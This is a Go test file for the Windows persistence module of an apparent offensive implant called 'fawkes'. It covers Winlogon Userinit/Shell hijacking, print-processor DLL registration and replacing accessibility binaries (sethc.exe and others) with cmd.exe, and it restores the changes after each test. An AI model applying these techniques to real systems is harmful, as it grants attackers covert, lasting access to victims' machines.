//go:build windows

package commands

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows/registry"
)

// --- Winlogon Helper Tests ---

func TestPersistWinlogon_InvalidTarget(t *testing.T) {
	result := persistWinlogon(persistArgs{
		Method: "winlogon",
		Action: "install",
		Name:   "badtarget",
		Path:   `C:\test\fawkes.exe`,
	})
	if result.Status != "error" {
		t.Errorf("expected error for invalid target, got %q: %s", result.Status, result.Output)
	}
	if !strings.Contains(result.Output, "userinit") || !strings.Contains(result.Output, "shell") {
		t.Error("error message should mention valid targets (userinit, shell)")
	}
}

func TestPersistWinlogon_UnknownAction(t *testing.T) {
	result := persistWinlogon(persistArgs{
		Method: "winlogon",
		Action: "badaction",
		Name:   "userinit",
	})
	if result.Status != "error" {
		t.Errorf("expected error for unknown action, got %q", result.Status)
	}
}

func TestPersistWinlogon_DefaultTarget(t *testing.T) {
	// When name is empty, should default to "userinit"
	// This will fail on non-admin (can't open HKLM), which is the expected behavior
	result := persistWinlogon(persistArgs{
		Method: "winlogon",
		Action: "install",
		Path:   `C:\test\fawkes.exe`,
	})
	// Either succeeds (admin) or errors (non-admin) — but should NOT error on "invalid target"
	if result.Status == "error" && strings.Contains(result.Output, "must be") {
		t.Error("empty name should default to 'userinit', not produce invalid target error")
	}
}

func TestPersistWinlogon_RemoveRequiresPath(t *testing.T) {
	result := persistWinlogon(persistArgs{
		Method: "winlogon",
		Action: "remove",
		Name:   "userinit",
		Path:   "", // No path specified
	})
	if result.Status != "error" {
		t.Errorf("expected error when path is empty for removal, got %q", result.Status)
	}
	if !strings.Contains(result.Output, "path is required") {
		t.Errorf("expected 'path is required' in error, got: %s", result.Output)
	}
}

func TestPersistWinlogon_Install_Userinit(t *testing.T) {
	// Read original Userinit value
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, winlogonKeyPath, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		t.Skipf("cannot open Winlogon key (need admin): %v", err)
	}
	original, _, err := key.GetStringValue("Userinit")
	if err != nil {
		key.Close()
		t.Skipf("cannot read Userinit: %v", err)
	}
	key.Close()

	testPayload := `C:\fawkes_test_persist_winlogon.exe`

	// Install
	result := persistWinlogon(persistArgs{
		Method: "winlogon",
		Action: "install",
		Name:   "userinit",
		Path:   testPayload,
	})
	if result.Status != "success" {
		t.Fatalf("install failed: %s", result.Output)
	}
	if !strings.Contains(result.Output, testPayload) {
		t.Errorf("output should contain payload path, got: %s", result.Output)
	}

	// Verify value was modified
	key, _ = registry.OpenKey(registry.LOCAL_MACHINE, winlogonKeyPath, registry.QUERY_VALUE)
	modified, _, _ := key.GetStringValue("Userinit")
	key.Close()
	if !strings.Contains(modified, testPayload) {
		t.Errorf("Userinit should contain payload, got: %s", modified)
	}

	// Duplicate install should fail
	result = persistWinlogon(persistArgs{
		Method: "winlogon",
		Action: "install",
		Name:   "userinit",
		Path:   testPayload,
	})
	if result.Status != "error" {
		t.Error("duplicate install should error")
	}

	// Remove
	result = persistWinlogon(persistArgs{
		Method: "winlogon",
		Action: "remove",
		Name:   "userinit",
		Path:   testPayload,
	})
	if result.Status != "success" {
		t.Fatalf("remove failed: %s", result.Output)
	}

	// Verify original restored
	key, _ = registry.OpenKey(registry.LOCAL_MACHINE, winlogonKeyPath, registry.QUERY_VALUE)
	restored, _, _ := key.GetStringValue("Userinit")
	key.Close()
	if strings.Contains(restored, testPayload) {
		t.Errorf("Userinit should not contain payload after removal, got: %s", restored)
	}
	if restored != original {
		// Restore original value manually
		key, _ = registry.OpenKey(registry.LOCAL_MACHINE, winlogonKeyPath, registry.SET_VALUE)
		key.SetStringValue("Userinit", original)
		key.Close()
		t.Logf("Userinit was not perfectly restored: original=%q, restored=%q (manually fixed)", original, restored)
	}
}

func TestPersistWinlogon_Install_Shell(t *testing.T) {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, winlogonKeyPath, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		t.Skipf("cannot open Winlogon key (need admin): %v", err)
	}
	original, _, err := key.GetStringValue("Shell")
	if err != nil {
		key.Close()
		t.Skipf("cannot read Shell: %v", err)
	}
	key.Close()

	testPayload := `C:\fawkes_test_persist_shell.exe`

	// Install
	result := persistWinlogon(persistArgs{
		Method: "winlogon",
		Action: "install",
		Name:   "shell",
		Path:   testPayload,
	})
	if result.Status != "success" {
		t.Fatalf("install failed: %s", result.Output)
	}

	// Verify
	key, _ = registry.OpenKey(registry.LOCAL_MACHINE, winlogonKeyPath, registry.QUERY_VALUE)
	modified, _, _ := key.GetStringValue("Shell")
	key.Close()
	if !strings.Contains(modified, testPayload) {
		t.Errorf("Shell should contain payload, got: %s", modified)
	}

	// Remove
	result = persistWinlogon(persistArgs{
		Method: "winlogon",
		Action: "remove",
		Name:   "shell",
		Path:   testPayload,
	})
	if result.Status != "success" {
		t.Fatalf("remove failed: %s", result.Output)
	}

	// Restore original as safety net
	key, _ = registry.OpenKey(registry.LOCAL_MACHINE, winlogonKeyPath, registry.SET_VALUE)
	key.SetStringValue("Shell", original)
	key.Close()
}

func TestPersistWinlogon_RemoveNonexistent(t *testing.T) {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, winlogonKeyPath, registry.QUERY_VALUE)
	if err != nil {
		t.Skipf("cannot open Winlogon key (need admin): %v", err)
	}
	key.Close()

	result := persistWinlogon(persistArgs{
		Method: "winlogon",
		Action: "remove",
		Name:   "userinit",
		Path:   `C:\nonexistent_payload_12345.exe`,
	})
	if result.Status != "error" {
		t.Errorf("removing nonexistent payload should error, got: %q", result.Status)
	}
}

// --- Print Processor Tests ---

func TestPersistPrintProcessor_MissingPath(t *testing.T) {
	result := persistPrintProcessor(persistArgs{
		Method: "print-processor",
		Action: "install",
		Name:   "TestProc",
	})
	if result.Status != "error" {
		t.Errorf("expected error for missing path, got %q", result.Status)
	}
	if !strings.Contains(result.Output, "path is required") {
		t.Errorf("expected 'path is required' in error, got: %s", result.Output)
	}
}

func TestPersistPrintProcessor_NonexistentDLL(t *testing.T) {
	result := persistPrintProcessor(persistArgs{
		Method: "print-processor",
		Action: "install",
		Name:   "TestProc",
		Path:   `C:\nonexistent_test_dll_12345.dll`,
	})
	if result.Status != "error" {
		t.Errorf("expected error for nonexistent DLL, got %q", result.Status)
	}
	if !strings.Contains(result.Output, "not found") {
		t.Errorf("expected 'not found' in error, got: %s", result.Output)
	}
}

func TestPersistPrintProcessor_DefaultName(t *testing.T) {
	// Verify default processor name is FawkesProc when name is empty
	result := persistPrintProcessor(persistArgs{
		Method: "print-processor",
		Action: "install",
		Path:   `C:\nonexistent.dll`,
	})
	// Will fail on DLL not found, but the error shouldn't be about missing name
	if strings.Contains(result.Output, "name") {
		t.Error("empty name should default to FawkesProc, not error about name")
	}
}

func TestPersistPrintProcessor_UnknownAction(t *testing.T) {
	result := persistPrintProcessor(persistArgs{
		Method: "print-processor",
		Action: "badaction",
	})
	if result.Status != "error" {
		t.Errorf("expected error for unknown action, got %q", result.Status)
	}
}

func TestPersistPrintProcessor_Remove(t *testing.T) {
	// Create a test registry key and verify removal
	testName := "FawkesTestProc"
	regPath := printProcessorRegBase + `\` + testName

	key, _, err := registry.CreateKey(registry.LOCAL_MACHINE, regPath, registry.SET_VALUE)
	if err != nil {
		t.Skipf("cannot create test registry key (need admin): %v", err)
	}
	key.SetStringValue("Driver", "testproc.dll")
	key.Close()

	result := persistPrintProcessor(persistArgs{
		Method: "print-processor",
		Action: "remove",
		Name:   testName,
		Path:   "testproc.dll",
	})
	if result.Status != "success" {
		t.Errorf("remove failed: %s", result.Output)
	}

	// Verify registry key is gone
	_, err = registry.OpenKey(registry.LOCAL_MACHINE, regPath, registry.QUERY_VALUE)
	if err == nil {
		// Cleanup if test failed
		registry.DeleteKey(registry.LOCAL_MACHINE, regPath)
		t.Error("registry key should be deleted after removal")
	}
}

// --- Accessibility Features Tests ---

func TestPersistAccessibility_DefaultTarget(t *testing.T) {
	// Verify default target is sethc.exe when name is empty
	result := persistAccessibility(persistArgs{
		Method: "accessibility",
		Action: "install",
		Path:   `C:\Windows\System32\cmd.exe`,
	})
	// Will likely fail (no admin) but error should reference sethc.exe
	if result.Status == "error" && !strings.Contains(result.Output, "sethc.exe") && !strings.Contains(result.Output, "System32") {
		t.Logf("Output: %s", result.Output)
	}
}

func TestPersistAccessibility_UnknownAction(t *testing.T) {
	result := persistAccessibility(persistArgs{
		Method: "accessibility",
		Action: "badaction",
		Name:   "sethc.exe",
	})
	if result.Status != "error" {
		t.Errorf("expected error for unknown action, got %q", result.Status)
	}
}

func TestPersistAccessibility_RemoveNoBackup(t *testing.T) {
	// Removing without a backup should fail gracefully
	result := persistAccessibility(persistArgs{
		Method: "accessibility",
		Action: "remove",
		Name:   "totally_fake_binary_12345.exe",
	})
	if result.Status != "error" {
		t.Errorf("expected error when no backup exists, got %q: %s", result.Status, result.Output)
	}
	if !strings.Contains(result.Output, "backup not found") {
		t.Errorf("expected 'backup not found' in error, got: %s", result.Output)
	}
}

func TestPersistAccessibility_NonexistentTarget(t *testing.T) {
	result := persistAccessibility(persistArgs{
		Method: "accessibility",
		Action: "install",
		Name:   "totally_fake_binary_12345.exe",
		Path:   `C:\Windows\System32\cmd.exe`,
	})
	if result.Status != "error" {
		t.Errorf("expected error for nonexistent target, got %q", result.Status)
	}
	if !strings.Contains(result.Output, "not found") {
		t.Errorf("expected 'not found' in error, got: %s", result.Output)
	}
}

func TestPersistAccessibility_InstallAndRemove(t *testing.T) {
	// Create temp files to simulate the binary replacement without touching System32
	tmpDir := t.TempDir()
	targetBin := filepath.Join(tmpDir, "test_target.exe")
	payloadBin := filepath.Join(tmpDir, "test_payload.exe")

	// Create target binary
	if err := os.WriteFile(targetBin, []byte("original binary content"), 0644); err != nil {
		t.Fatal(err)
	}
	// Create payload binary
	if err := os.WriteFile(payloadBin, []byte("payload binary content"), 0644); err != nil {
		t.Fatal(err)
	}

	// Test copyFileSimple (used by accessibility)
	backupPath := targetBin + ".bak"
	if err := copyFileSimple(targetBin, backupPath); err != nil {
		t.Fatalf("copyFileSimple failed: %v", err)
	}

	// Verify backup content
	content, _ := os.ReadFile(backupPath)
	if string(content) != "original binary content" {
		t.Errorf("backup content = %q, want 'original binary content'", string(content))
	}

	// Replace target with payload
	if err := copyFileSimple(payloadBin, targetBin); err != nil {
		t.Fatalf("copyFileSimple replace failed: %v", err)
	}

	// Verify replacement
	content, _ = os.ReadFile(targetBin)
	if string(content) != "payload binary content" {
		t.Errorf("replaced content = %q, want 'payload binary content'", string(content))
	}

	// Restore from backup
	if err := copyFileSimple(backupPath, targetBin); err != nil {
		t.Fatalf("copyFileSimple restore failed: %v", err)
	}

	content, _ = os.ReadFile(targetBin)
	if string(content) != "original binary content" {
		t.Errorf("restored content = %q, want 'original binary content'", string(content))
	}
}

// --- Dispatch Tests ---

func TestPersistCommand_DispatchNewMethods(t *testing.T) {
	cmd := &PersistCommand{}

	// Verify new methods are recognized (not "Unknown method")
	for _, method := range []string{"winlogon", "print-processor", "accessibility"} {
		t.Run(method, func(t *testing.T) {
			params, _ := json.Marshal(persistArgs{Method: method, Action: "install"})
			result := cmd.Execute(structs.Task{Params: string(params)})
			// May error for various reasons (no admin, missing params) but should NOT be "Unknown method"
			if strings.Contains(result.Output, "Unknown method") {
				t.Errorf("method %q should be recognized, got: %s", method, result.Output)
			}
		})
	}
}

// --- List Enumeration Tests ---

func TestPersistList_ContainsNewSections(t *testing.T) {
	result := listPersistence(persistArgs{Method: "list"})
	if result.Status != "success" {
		t.Fatalf("list failed: %s", result.Output)
	}

	expectedSections := []string{
		"Winlogon Helper",
		"Print Processors",
		"Accessibility Features",
	}
	for _, section := range expectedSections {
		if !strings.Contains(result.Output, section) {
			t.Errorf("list output should contain %q section", section)
		}
	}
}

// --- Accessibility Targets Tests ---

func TestAccessibilityTargets(t *testing.T) {
	expected := []string{"sethc.exe", "utilman.exe", "osk.exe", "narrator.exe", "magnify.exe"}
	if len(accessibilityTargets) != len(expected) {
		t.Errorf("expected %d targets, got %d", len(expected), len(accessibilityTargets))
	}
	for i, exp := range expected {
		if i < len(accessibilityTargets) && accessibilityTargets[i][0] != exp {
			t.Errorf("target[%d] = %q, want %q", i, accessibilityTargets[i][0], exp)
		}
	}
}
